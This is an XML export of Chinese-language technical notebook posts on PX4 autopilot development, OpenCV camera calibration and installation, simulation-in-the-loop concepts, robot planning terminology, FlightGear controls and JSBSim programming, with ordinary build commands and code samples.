    <content type="text"><![CDATA[本文说明如何创建和运行第一个板载应用程序。 它涵盖了PX4上应用程序开发所需的所有基本概念和API。 开发环境在开发第一个PX4应用程序之前，需要构建如下开发环境： PX4 SITL模拟器或兼容PX4的飞行控制器。 PX4开发工具链用于所需目标。 从Github下载PX4源代码 简单应用代码编写本节创建一个最小的应用，仅用于打印Hello Sky！。整个应用由一个简单C文件和一个cmake定义文件构成。具体步骤如下： 创建目录Firmware/src/examples/px4_simple_app 在上述目录中创建C文件px4_simple_app.c 在上述目录中创建cmake定义文件CMakeLists.txt px4_simple_app.c代码内容如下： 12345678910111213141516/** * @file px4_simple_app.c * Minimal application example for PX4 autopilot * * @author Example User &lt;mail@example.com&gt; */#include &lt;px4_log.h&gt;__EXPORT int px4_simple_app_main(int argc, char *argv[]);int px4_simple_app_main(int argc, char *argv[])&#123; PX4_INFO(&quot;Hello Sky!&quot;); return OK;&#125; CMakeLists.txt文件内容如下： 123456789px4_add_module( MODULE examples__px4_simple_app MAIN px4_simple_app STACK_MAIN 2000 SRCS px4_simple_app.c DEPENDS platforms__common ) px4_add_module()方法从模块描述构建静态库。 MAIN块列出了模块的名称 。这会将该模块与NuttX一起注册，以便可以从PX4 shell或SITL控制台调用它。 编译链接针对不同的目标平台，使用不同的make命令构建： jMAVSim Simulator: make posix_sitl_default jmavsim Pixhawk v1/2: make px4fmu-v2_default Pixhawk v3: make px4fmu-v4_default 测试应用（硬件）上传固件到开发板在开发板上测试，使用如下命令上传PX4固件： Pixhawk v1/2: make px4fmu-v2_default upload Pixhawk v3: make px4fmu-v4_default upload 连接控制台现在通过串口或USB连接到系统控制台。 点击ENTER将弹出shell提示符： 1234nsh&gt;nsh&gt;helpnsh&gt; px4_simple_appHello Sky! 测试应用（SITL）如果您正在使用SITL，PX4控制台将自动启动。 与nsh控制台一样，您可以键入help以查看内置应用程序列表。 输入px4_simple_app以运行最小应用程序。 12pxh&gt; px4_simple_appINFO [px4_simple_app] Hello Sky! 参考链接 PX4编译开发环境配置,by jackhuang. PX4开发基本概念解读,by jackhuang. First Application Tutorial (Hello Sky),by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCV4.0相机标定教程]]></title>
    <url>%2F2019%2F04%2F28%2FOpenCV4-0%E7%9B%B8%E6%9C%BA%E6%A0%87%E5%AE%9A%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[相机已经存在了很长时间。 然而，随着20世纪后期廉价针孔相机的推出，它们成为我们日常生活中的常见现象。 不幸的是，这种便宜与其价格有关：严重失真。 幸运的是，这些是常数，并且通过校准和一些重新映射，我们可以纠正这一点。 此外，通过校准，您还可以确定相机的自然单位（像素）与真实世界单位（例如毫米）之间的关系。这个校准过程就是相机标定。 理论对于失真，OpenCV考虑了径向和切向因子。 对于径向因子，使用以下公式： x_{distorted} = x( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6) \\ y_{distorted} = y( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6)因此，对于$（x，y）$坐标处的未失真像素点，其在失真图像上的位置将是$（x{distorted},y{distorted}）$。 径向变形的存在表现为“桶状”或“鱼眼”效应。 由于摄像镜头与成像平面不完全平行，因此会发生偏心畸变。 它可以通过公式表示： x_{distorted} = x + [ 2p_1xy + p_2(r^2+2x^2)] \\ y_{distorted} = y + [ p_1(r^2+ 2y^2)+ 2p_2xy]所以我们有五个失真参数，在OpenCV中呈现为一行矩阵，有5列： distortion\_coefficients=(k_1 \hspace{10pt} k_2 \hspace{10pt} p_1 \hspace{10pt} p_2 \hspace{10pt} k_3)现在我们使用以下公式进行单位转换： \left [ \begin{matrix} x \\ y \\ w \end{matrix} \right ] = \left [ \begin{matrix} f_x & 0 & c_x \\ 0 & f_y & c_y \\ 0 & 0 & 1 \end{matrix} \right ] \left [ \begin{matrix} X \\ Y \\ Z \end{matrix} \right ]这里通过使用单应性坐标系（和$w = Z$）来解释$w$的存在。 未知参数是$f_x$和$f_y$（相机焦距）和（$c_x，c_y$），它们是以像素坐标表示的光学中心。 如果对于两个轴，使用具有给定纵横比（通常为1）的共同焦距，则$f_y = f_x a$，并且在上部公式中，我们将具有单个焦距$f$。 包含这四个参数的矩阵称为*相机矩阵。 虽然无论使用何种相机分辨率，失真系数都是相同的，但应根据校准分辨率的当前分辨率进行缩放。 确定这两个矩阵的过程是校准。 通过基本几何方程计算这些参数。 使用的等式取决于所选择的校准对象。 目前，OpenCV支持三种类型的校准对象： 古典黑白棋枰 对称的圆圈图案 不对称的圆圈图案 基本上，您需要使用相机拍摄这些图案的快照，然后让OpenCV找到它们。 每个找到的模式都会产生一个新的等式。 要求解方程，您需要至少预定数量的模式快照，以形成一个良好的方程系统。 棋盘图案的数量较高，圆圈图案的数量较少。 例如，理论上棋盘图案需要至少两个快照。 但是，实际上我们的输入图像中存在大量噪声，因此为了获得良好的结果，您可能需要至少10个不同位置的输入模式的快照。 目标OpenCV4.0中相机标定样例程序的目标： 确定失真矩阵 确定相机矩阵 从摄像机，视频和图像文件列表中获取输入 从XML / YAML文件中读取配置 将结果保存到XML / YAML文件中 计算重新投影误差 源代码您也可以在OpenCV源库的samples / cpp / tutorial_code / calib3d / camera_calibration /文件夹中找到源代码，或从此处下载。要使用该程序，请使用-h参数运行它。该程序有一个重要的参数：配置文件的名称。如果没有给出，那么它将尝试打开名为“default.xml”的那个。这是XML格式的示例配置文件。在配置文件中，您可以选择将相机用作输入，视频文件或图像列表。如果选择最后一个，则需要创建一个配置文件，用于枚举要使用的图像。这是一个例子。要记住的重要部分是需要使用绝对路径或应用程序工作目录中的相对路径来指定图像。您可以在上面提到的samples目录中找到所有这些。 应用程序启动时从配置文件中读取设置。虽然这是它的一个重要部分，但它与本教程的主题无关：摄像机校准。因此，我选择不在此处发布该部分的代码。有关如何执行此操作的技术背景，您可以在使用XML和YAML文件的文件输入和输出教程中找到。 构建相机标定程序切换到camera_calibration示例教程源代码所在目录，创建build临时目录并创建CMakeLists.txt文件。 123cd ~/opencv/samples/cpp/tutorial_code/calib3d/camera_calibration/mkdir buildtouch CMakeLists.txt CMakeLists.txt文件内容如下：1234567cmake_minimum_required(VERSION 2.8)set (CMAKE_CXX_STANDARD 11)project( camera_calibration )find_package( OpenCV REQUIRED )include_directories( $&#123;OpenCV_INCLUDE_DIRS&#125; )add_executable( camera_calibration camera_calibration.cpp )target_link_libraries( camera_calibration $&#123;OpenCV_LIBS&#125; ) 构建相机标定程序：123cd buildcmake ..make 运行相机标定程序运行相机标定程序的目的在于获得相机的失真参数和内外参，其中相机的失真参数和内参只需标定一次便不再变化。下面以标定笔记本自带摄像头说明运行相机标定程序的步骤。 修改标定配置参数找到camera_calibration/in_VID5.xml文件，这是标定程序使用的配置文件，需要设置里面的几个参数。 修改棋盘格交叉点参数 123&lt;!-- Number of inner corners per a item row and column. (square, circle) --&gt;&lt;BoardSize_Width&gt;9&lt;/BoardSize_Width&gt;&lt;BoardSize_Height&gt;6&lt;/BoardSize_Height&gt; 需要特别注意的是，这里的宽度和高度是指内部交叉点的个数，而不是方形格的个数。如图1所示的棋盘格，内部交叉点的宽度是9，高度是6。请务必填写正确，否则无法标定。 图1 用于相机标定的棋盘格 修改每格的宽度 每格的宽度应设置为实际的毫米数，该参数的实际用途尚待考证。目前看来，即使设置的不准确也无大碍。根据我使用的棋盘格，设置棋盘格参数42。 12&lt;!-- The size of a square in some user defined metric system (pixel, millimeter)--&gt;&lt;Square_Size&gt;42&lt;/Square_Size&gt; 设置图像输入方式 例程提供了三种输入方式。不过，如果待标定的摄像头已经接入电脑，建议使用input camera方式。该方式只需要设置视频输入设备号，对于笔记本电脑来说，通常0表示笔记本自带摄像头，1表示外接摄像头。 123456 &lt;!-- The input to use for calibration. To use an input camera -&gt; give the ID of the camera, like &quot;1&quot; To use an input video -&gt; give the path of the input video, like &quot;/tmp/x.avi&quot; To use an image list -&gt; give the path to the XML or YAML file containing the list of the images, like &quot;/tmp/circles_list.xml&quot; --&gt;&lt;Input&gt;&quot;0&quot;&lt;/Input&gt; 执行相机标定程序运行如下命令开始标定笔记本自带摄像头，标定完成后将得到保存相关参数的文件。 1./camera_calibration ../in_VID5.xml 参考链接 Using OpenCV with gcc and CMake,by opencv. Camera calibration With OpenCV,by opencv. C++11 activation with or ,by stackoverflow. 计算机视觉之相机成像原理与坐标系转换,by jack huang. OpenCV 相机参数标定（Camera Calibration）,by Wafei. 图像二维坐标转世界三维坐标, by 橙子. solvepnp三维位姿估算,by cocoaqin.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu_16.04安装OpenCV的方法]]></title>
    <url>%2F2019%2F04%2F28%2FUbuntu-16-04%E5%AE%89%E8%A3%85opencv%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文记录在Ubuntu16.04 LTS操作系统中从源代码编译安装OpenCV的过程。 安装必需的软件包123[compiler] sudo apt-get install build-essential[required] sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev[optional] sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev 下载OpenCV源代码123cd ~/&lt;my_working_directory&gt;git clone https://github.com/opencv/opencv.gitgit clone https://github.com/opencv/opencv_contrib.git 使用CMake构建OpenCV创建临时的build目录1234567cd ~/opencv# 查看并检出OpenCV最新发布版git taggit checkout 4.1.0mkdir buildcd build 创建配置文件12345$ cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..# 可选，如使用opencv_contrib, 采用如下命令生成编译配置文件$ cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local -D OPENCV_EXTRA_MODULES_PATH=../../opencv_contrib/modules ..# 可选，构建示例程序和文档cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local -D BUILD_EXAMPLES=1 -D BUILD_DOCS=1 .. 构建OpenCV1make -j3 # runs 3 jobs in parallel 安装OpenCV1sudo make install 参考链接 Installation in Linux, by opencv. 4.0.0 does not produce pkgconfig file, by opencv. Pkg-config,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4开发基本概念解读]]></title>
    <url>%2F2019%2F04%2F27%2FPX4%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%A7%A3%E8%AF%BB%2F</url>
    <content type="text"><![CDATA[进行PX4开发，必先了解PX4体系结构及相关概念。下面及简要介绍PX4开发的相关知识。 PX4体系结构PX4由两个层次组成：一是飞行控制栈(flight stack)，即自驾仪的软件解决方案，二是中间件，一种可以支持任意类型自主机器人的通用机器人中间件。 所有的无人机机型，事实上所有的包括船舶在内的机器人系统，都具有同一代码库。整个系统设计是反应式(reactive)的，这意味着： 所有的功能被划分为可替换部件 通过异步消息传递进行通信 该系统可以应对不同的工作负载 除了这些运行时考虑之外，其模块化最大限度地提高了系统的可重用性。 图1 PX4体系结构 飞行控制栈飞行控制栈是自主无人机的引导、导航和控制算法的集合。它包括用于固定翼，多旋翼和垂直起降机身的控制器以及用于姿态和位置的估计器。 图2显示了飞行控制栈的构建块的预览。 它包含从传感器，RC输入和自主飞行控制（导航器）到电机或伺服控制（执行器）的完整管道。 图2 PX4飞行控制栈结构图 估计器采用一个或多个传感器输入，组合它们，并计算无人机状态（例如来自IMU传感器数据的姿态）。 控制器是将设定值和测量或估计状态（过程变量）作为输入的组件。 其目标是调整过程变量的值，使其与设定值匹配。 输出是最终达到该设定点的校正。 例如，位置控制器将位置设定点作为输入，过程变量是当前估计的位置，输出是将车辆移向期望位置的姿态和推力设定点。 混合器接受强制命令（例如向右转）并将它们转换为单独的电机命令，同时确保不超过某些限制。 该平移特定于无人机类型并且取决于各种因素，例如关于重心的马达布置或无人机的转动惯量。 中间件中间件主要包括嵌入式传感器的设备驱动程序，与外部世界的通信（协同计算机，地面控制站等）和uORB发布 - 订阅消息总线。 此外，中间件包括一个模拟层，允许PX4飞行代码在桌面操作系统上运行，并在模拟的“世界”中控制计算机建模的无人机。 更新速率由于模块等待消息更新，因此驱动程序通常会定义模块更新的速度。 大多数IMU驱动器以1kHz采样数据，将其集成并以250Hz发布。 系统的其他部分，例如导航器，不需要如此高的更新速率，因此运行速度相当慢。 可以通过运行uorb top在系统上实时检查消息更新率。 运行时环境PX4可在各种提供POSIX-API的操作系统上运行（例如Linux，macOS，NuttX或QuRT）。 它还应该具有某种形式的实时调度（例如FIFO）。 模块间通信（使用uORB）基于共享内存。 整个PX4中间件在单个地址空间中运行，即在所有模块之间共享存储器。 有两种不同的方式可以执行模块： 任务：模块在自己的任务中运行，具有自己的堆栈和进程优先级（这是更常见的方式）。 工作队列：模块在共享任务上运行，这意味着它不拥有堆栈。 多个任务在同一堆栈上运行，每个工作队列具有一个优先级。 通过指定将来的固定时间来安排任务。 优点是它使用较少的RAM，但不允许任务在消息上休眠或轮询。 工作队列用于周期性任务，例如传感器驱动器或陆地探测器。 操作系统相关信息NuttXNuttX是在飞行控制板上运行PX4的主要RTOS。 它是开源（BSD许可证），重量轻，高效且非常稳定。 模块作为任务执行：它们有自己的文件描述符列表，但它们共享一个地址空间。 任务仍然可以启动共享文件描述符列表的一个或多个线程。 每个任务/线程都有一个固定大小的堆栈，并且有一个周期性任务，它检查所有堆栈是否有足够的可用空间（基于堆栈着色）。 Linux / MacOS在Linux或macOS上，PX4在单个进程中运行，并且模块在它们自己的线程中运行（NuttX上的任务和线程之间没有区别）。 PX4飞行模式飞行模式定义了系统在任何给定时间的状态。用户可以使用远程遥控器或者QGroundControl地面站来进行飞行模式切换。 图3 PX4飞行模式控制流程图 Dronecode平台软硬件架构Dronecode是开源的无人机平台，其软硬件体系结构如图4所示。图4左侧显示了一种可能的硬件配置，其中飞行控制器（浅蓝色）通过RTPS连接到感知计算机（深蓝色）。 感知计算机使用相机传感器阵列提供视觉控制和物体避免，并且具有单独的有效载荷相机。 图的右侧显示了端到端软件堆栈。 堆栈“近似”水平对齐图表的硬件部分，并进行颜色编码，以显示飞行控制器上运行的软件以及配套计算机上的软件。 图4 Dronecode平台软硬件架构 PX4位姿控制多旋翼位置控制 图5 PX4多旋翼位置控制 混合和执行器PX4架构保证了核心控制器中不需要针对机身布局做特别处理。 混控指的是把输入指令（例如：遥控器打右转）分配到电机以及舵机的执行器（如电调或舵机PWM）指令。对于固定翼的副翼控制而言，每个副翼由一个舵机控制，那么混控的意义就是控制其中一个副翼抬起而另一个副翼落下。同样的，对多旋翼而言，俯仰操作需要改变所有电机的转速。 将混控逻辑从实际姿态控制器中分离出来可以大大提高复用性。 控制管线一个特定的控制器（如姿态控制器）发送特定的归一化（-1..+1）的命令到给混合（mixing）,然后混合后输出独立的PWM到执行器（电调，舵机等）.在经过输出驱动如（串口，UAVCAN，PWM）等将归一化的值再转回特性的值（如输出1300的PWM等）。 图6 PX4控制管线 控制组PX4 有输入组和输出组的概念，顾名思义：控制输入组（如： attitude），就是用于核心的飞行姿态控制，（如： gimbal ）就是用于挂载控制. 一个输出组就是一个物理总线，如前8个PWM组成的总线用于舵机控制，组内带8个归一化（-1..+1）值,一个混合就是用于输入和输出连接方式（如:对于四轴来说,输入组有俯仰，翻滚，偏航等，对于于向前打俯仰操作，就需要改变输出组中的4个电调的PWM输出值，前俩个降低转速，后两个增加转速，飞机就向前）。 对于简单的固定翼来说，输入0（roll），就直接连接到输出的0（副翼）。对于多旋翼来说就不同了，输入0（roll）需要连接到所有的4个电机。 参考链接 PX4 Development Guide (STABLE - v1.8.2),by Dronecode. PX4开发指南, by Dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4编译开发环境配置]]></title>
    <url>%2F2019%2F04%2F26%2FPX4%E7%BC%96%E8%AF%91%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[拟在基于NuttX的硬件平台如Pixhawk系列开源硬件平台上运行自定义的Px4自驾仪软件，因此需要建立Px4的编译开发环境。以官方文档推荐，在Ubuntu 16.04 LTS操作系统上建立Px4编译开发环境为例，记录整个配置过程。 安装Ubuntu 16.04 LTS官方推荐在Mac OS和Linux上进行开发，因此选择安装Ubuntu 16.04 LTS作为Px4开发的操作系统。主要步骤如下： 安装VirtualBox系统虚拟机 在VirtualBox创建虚拟机 在虚拟机中安装Ubuntu 16.04 LTS操作系统 Ubuntu中安装工具链权限设置为了使当前用户能够访问串口，将当前用户添加到dialout组。 12sudo usermod -a -G dialout $USERreboot 安装工具链Pixhawk/NuttX (and jMAVSim)针对基于NuttX的硬件平台如Pixhawk构建开发工具链，步骤如下： 下载ubuntu_sim_nuttx.sh 运行脚本ubuntu_sim_nuttx.sh 完成后重启 123wget https://raw.githubusercontent.com/PX4/Devguide/master/build_scripts/ubuntu_sim_nuttx.shsource ubuntu_sim_nuttx.shreboot 编译Px4软件下载Px4源代码12345678910111213mkdir -p ~/srccd ~/srcgit clone https://github.com/PX4/Firmware.gitcd Firmware# list the releases (tags)git tag -l# Checkout code for particular tag (e.g. for tag v1.8.2 stable version)git checkout v1.8.2git submodule update --init --recursive 现在可以通过编译源代码来构建二进制文件。在直接使用硬件前，推荐先进行仿真。 jMAVSim仿真器在直接使用硬件之前，以jMAVSim仿真器为目标平台构建PX4，验证PX4的正确性。注意在virtualbox中启动3D图形加速，防止jMAVSim运行出错！ 1234make posix jmavsim# 起飞四旋翼无人机pxh&gt; commander takeoff 基于NuttX / Pixhawk的硬件板以Pixhawk为目标平台，构建PX4。 12cd Firmwaremake px4fmu-v2_default 注意到“make”是一个字符命令编译工具，“px4fmu-v2”是硬件/ardupilot版本，“default”是默认配置，所有的PX4编译目标遵循这个规则。 成功编译的最后输出是这样的： 12345[100%] Linking CXX executable firmware_nuttx[100%] Built target firmware_nuttxScanning dependencies of target build/firmware_px4fmu-v2[100%] Generating nuttx-px4fmu-v2-default.px4[100%] Built target build/firmware_px4fmu-v2 通过在命令后面添加‘upload’，编译的二进制程序就会通过USB上传到飞控硬件: 1make px4fmu-v2_default upload 上传成功时输出情况如下： 123456Erase : [====================] 100.0%Program: [====================] 100.0%Verify : [====================] 100.0%Rebooting.[100%] Built target upload 参考链接 PX4 Development Guide (STABLE - v1.8.2),by Dronecode. PX4开发指南, by Dronecode. running JMAVSim in vmware fails, by jMAVSim issues.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[硬件在环与软件在环概念辨析]]></title>
    <url>%2F2019%2F04%2F25%2F%E7%A1%AC%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在PX4自驾仪软件的二次开发过程中，涉及硬件在环与软件在环两个概念，不易理解。下面对这两个概念进行辨析。 基本概念硬件在环硬件在环（Hardware in the Loop，简称HIL）即硬件在控制环路，是一种半实物仿真。根据控制器和控制对象是否为真实硬件，分为以下两种硬件在环方式： 虚拟控制器+实际对象=快速控制原型(RCP)仿真系统，是系统的一种半实物仿真； 实际控制器+虚拟对象=硬件在回路(HIL)仿真系统，是系统的另一种半实物仿真。 硬件在环主要用于测试控制器系统。 软件在环软件在环主要测试控制器模型与控制器模型代码实现之间的一致性。 处理器在环软件在环主要测试控制器模型与控制器模型代码实现在目标处理器上运行之间的一致性。 模型在环模型在环（Model in the Loop，简称MIL）是用模型驱动进行嵌入式系统的开发时，在开发阶段初期及建模阶段中进行的仿真方式。嵌入式系统需和其运作的环境互动，一般会预期有合理的传感器信号为其输入，也会依输入及系统设计来驱动实体系统。为了使系统正常工作，需要将嵌入式系统的环境纳入仿真考量范围内。若嵌入式系统模型和环境模型连接，一起进行仿真，则即称为模型在环模拟。 模型在环主要用于测试控制算法，其控制器模型和控制器对象都是虚拟的。 参考链接 请明白人通俗的解释一下什么叫硬件在环？, by zhihu. 简单说说MIL、SIL、PIL和HIL, by Wangxn665. 模型在环, by wikipedia. 硬件在环, by 百度百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器人路径规划、轨迹规划和运动规划概念辨析]]></title>
    <url>%2F2019%2F04%2F17%2F%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%B7%AF%E5%BE%84%E8%A7%84%E5%88%92-%E8%BD%A8%E8%BF%B9%E8%A7%84%E5%88%92%E5%92%8C%E8%BF%90%E5%8A%A8%E8%A7%84%E5%88%92%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在机器人自动控制研究中，路径规划、轨迹规划和运动规划三个概念总是混淆不清，难以捉摸。下面结合各种资料，给出我个人的一些理解，对这三个概念进行辨析。 基本概念路径规划（path planning）路径是机器人位姿的一定序列，不考虑机器人位姿参数随时间变化的因素。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度。 轨迹规划（trajectory planning）路径是机器人位姿的一定序列，不考虑机器人位姿参数随时间变化的因素。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度，而轨迹规划是赋予路径时间信息。 运动规划（motion planning）运动规划就是在给定的位置A与位置B之间为机器人找到一条符合约束条件的路径。运动规划包含路径规划和轨迹规划。 运动规划，又称运动插补，是在给定的路径端点之间插入用于控制的中间点序列从而实现沿给定的平稳运动。 运动控制则是主要解决如何控制目标系统准确跟踪指令轨迹的问题，即对于给定的指令轨迹，选择适合的控制算法和参数，产生输出，控制目标实时，准确地跟踪给定的指令轨迹。 参考链接 运动（motion）规划、路径（path）规划和轨迹（trajectory）规划之区别,by Roger_Ceng. 运动规划/路径规划/轨迹规划,by 小白鼠2号. 运动规划 | 简介篇,by qqfly. 无人车运动规划，路径规划，轨迹规划的区别和联系？, by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear简易飞行教程]]></title>
    <url>%2F2019%2F03%2F29%2FFlightGear%E7%AE%80%E6%98%93%E9%A3%9E%E8%A1%8C%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[FlightGear是一个始于1997年多平台飞行模拟器、自由软件项目。下面简要介绍如何在FlightGear中驾驶飞行。 常用快捷键飞机操纵 9/3 推力：9增加推力（油门），3减小推力（油门） 4/6 副翼：4向左滚转，6向右滚转 8/2 升降舵：8推杆低头，2拉杆抬头 0/Enter 方向舵：0向右偏航，Enter向右偏航 5 居中副翼/升降舵/方向舵 ]/[ 放/收襟翼 g/G 收/放起落架 b/B 刹车（全部轮胎）/或释放刹车 视角变换 x/X 放大/缩小 v/V 切换飞行员的观测模式 Tab 循环切换鼠标模式：正常模式(默认)、控制模式和查看模式。 自动驾驶 Ctril + A 高度保持开关 Ctril + G 下滑角跟随开关 Ctril + H 航向保持开关 Ctril + N NAV 开关 Ctril + T 地形跟随开关 Ctril + U 高度增加 1000 英尺（紧急情况） 起飞教程起飞步骤如下： 1.启动引擎 在驾驶舱内通过按键启动飞机引擎的过程很麻烦，且各种类型飞机引擎启动过程不一样。幸运的是，FlightGear的飞机菜单中会有自动启动或快速启动的子菜单，点击它们自动启动飞机引擎和各种航电设备。 2.释放刹车 使用快捷键B释放刹车。 3.滑跑起飞 飞机尽量在跑道中央进行滑跑起飞，使用快捷键“0/Enter”控制飞机方向舵，使飞机在跑道中央滑跑; 当飞机达到起飞速度（一般200～300km/h）时，先使用快捷键“5”居中副翼/升降舵/方向舵，以降低飞机在空中操纵的难度，再使用快捷键“8/2”操纵飞机升降舵，注意应避免仰角过大。 武器使用教程各种战斗机可通过飞机菜单选择不同武器加载方案。但各种战斗机的武器使用方法不一样，对应武器发射的快捷键也不一样，可通过菜单“Help-&gt;Aircraft Help”查看具体飞机的自定义快捷键。下面以官方飞机库中的F15和F16为例说明武器使用方法。 F15F15武器使用步骤如下： 1.打开Master ARM开关 该军械总开关防止武器误发射，使用快捷键Ctrl+w控制。 2.选择武器 可选择航炮和导弹等武器，使用快捷键m控制 3.发射航炮或释放导弹 使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。 4.使用诱饵弹 使用快捷键Ctrl+q释放诱饵弹。 F16F16武器使用步骤如下： 1.打开Master ARM开关 该开关防止武器误发射，使用快捷键m控制。 2.选择武器 可选择航炮和导弹等武器，使用快捷键w控制 3.发射航炮或释放导弹 使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。 4.使用诱饵弹 使用快捷键q释放诱饵弹。 参考链接 FlightGear,by wikipedia. FlightGear基本飞行操作快捷键,by zxc.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSBSim编程实践之入门]]></title>
    <url>%2F2019%2F03%2F27%2FJSBSim%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。JSBSim可以独立运行，通过命令行参数指定飞行器和初始状态，进行简单情境下的飞行动力学仿真，也可以将JSBSim作为代码库，编程实现飞行器模型加载，设置输入，获得输出。下面即介绍在Linux平台编程调用JSBSim库的方法和步骤。 基础知识gcc与g++GNU编译器套装（英语：GNU Compiler Collection，缩写为GCC），指一套编程语言编译器，以GPL及LGPL许可证所发行的自由软件，也是GNU项目的关键部分，也是GNU工具链的主要组成部分之一。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。 通常gcc用于编译链接c代码文件，而g++用于编译链接c++代码文件，但它们的使用方法很类似。下面介绍gcc和g++的常用选项。 添加头文件搜索路径 1gcc foo.c -I /home/xiaowp/include -o foo 添加动态库搜索路径 1gcc foo.c -L /home/xiaowp/lib -lfoo -o foo 添加静态库搜索路径 1gcc foo.c -L /home/xiaowp/lib -static -lfoo -o foo 编程实践最简仿真下面是JSBSim参考手册中的最简单实例，因JSBSim的不断开发，JSBSim参考手册中该编程实例有点过时，因此进行了少量修改。 1234567891011121314#include &lt;FGFDMExec.h&gt;#include &lt;sg_path.hxx&gt; using namespace std;int main(int argc, char **argv)&#123; JSBSim::FGFDMExec FDMExec; bool result = true; FDMExec.LoadScript(SGPath::fromUtf8(argv[1])); while (result) result = FDMExec.Run();&#125; 从上述代码可知，调用JSBSim的主要方法是利用FGFDMExec类，通过实例化一个FGFDMExec类，就相当于获得了一个运行JSBSim仿真的工具箱，通过这个工具箱就可以调用JSBSim的大部分功能，实现我们要的仿真目标。 接下来对该实例进行编译链接，使用如下命令： 12# jsbsim_script.cpp是上述实例的代码文件g++ jsbsim_script.cpp -I ../jsbsim/src/ -I../jsbsim/src/simgear/misc -L ../jsbsim/build/src/ -static -l JSBSim -o jsbsim_script 测试该实例，使用如下命令：1234# jsbsim是JSBSim项目文件夹# JSBSimTest是JSBSim测试实例所在文件夹cd jsbsim../JSBSimTest/jsbsim_script ./scripts/c1723.xml 参考链接 JSBSim编程实践,by 32768. Linux平台编译安装测试JSBSim,by jack huang. JSBSim Reference Manual ,by jsbsim. gcc和g++头文件和库路径的寻找和添加,by 周学伟. GCC,by wikipedia. WHAT IS THE DIFFERENCE BETWEEN GCC AND G++,by KITTY GUPTA.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四旋翼无人机制作简易教程]]></title>
    <url>%2F2019%2F03%2F25%2F%E5%9B%9B%E6%97%8B%E7%BF%BC%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%88%B6%E4%BD%9C%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
